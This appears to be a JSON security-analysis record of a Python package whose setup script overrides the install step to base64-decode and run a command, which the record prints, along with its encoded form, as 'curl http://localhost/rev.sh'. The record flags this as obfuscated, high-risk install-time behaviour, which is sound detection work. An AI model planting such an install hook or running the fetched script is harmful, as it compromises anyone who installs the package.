{
  "purpose": "The code appears to define a setup script for a Python package, but includes obfuscated code that executes a network request upon installation, suggesting potential malicious intent.",
  "sources": "The 'notmalfunc' function reads a base64-encoded string, decodes it, and executes the command contained within. This function is called during the 'install' command execution.",
  "sinks": "The 'os.system' call executes a decoded string which performs a network request to 'http://localhost/rev.sh'. This is a potential sink where untrusted input (decoded command) could be executed.",
  "flows": "The base64 string is decoded by 'b64d' function, then passed to 'os.system' in 'notmalfunc', executing a remote or local script which may perform malicious actions.",
  "anomalies": "Obfuscated code via base64 encoding that is decoded at runtime and executed immediately during package installation. The URL used ('http://localhost/rev.sh') is suspicious, as it points to localhost, which is unlikely to serve external malicious content but could be a placeholder or local backdoor.",
  "analysis": "The code imports setup tools and overrides the 'install' class to execute 'notmalfunc' during installation. 'notmalfunc' decodes a base64 string and runs it via 'os.system'. The base64 string 'Y3VybCBodHRwOi8vbG9jYWxob3N0L3Jldi5zaAo=' decodes to 'curl http://localhost/rev.sh', indicating an attempt to execute a remote script. While the URL points to localhost, the pattern is similar to malicious behavior where external commands could be fetched and run. The use of base64 obfuscation hides the intent of the code, suggesting malicious intent or at least an attempt to evade detection. Overall, the code installs a package that, during setup, executes a potentially malicious network request, constituting a high security risk.",
  "conclusion": "The package contains obfuscated code that executes a network command during installation, which could be malicious. Although the URL is localhost, the pattern indicates potential malicious behavior or backdoor functionality. The code should be considered high risk due to the obfuscation and execution of decoded commands during install.",
